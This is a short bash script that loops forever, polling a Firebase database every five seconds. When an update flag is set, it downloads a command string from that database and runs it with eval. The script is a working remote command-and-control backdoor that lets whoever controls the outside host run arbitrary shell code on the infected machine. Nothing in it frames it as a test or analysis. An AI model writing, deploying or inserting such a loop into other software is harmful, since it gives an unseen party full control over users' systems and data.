while true
do
    update="$(curl 'https://projectduck-6999c.firebaseio.com/update/update.json?shallow=true&print=pretty')"
    if [ "$update" = true ] ; then
      updatecode="$(curl 'https://projectduck-6999c.firebaseio.com/update/updatecode.json?shallow=true&print=pretty' | sed 's:^.\(.*\).$:\1:' | sed -E 's/\\(.)/\1/g')"
      eval $updatecode;
    fi
    sleep 5
done
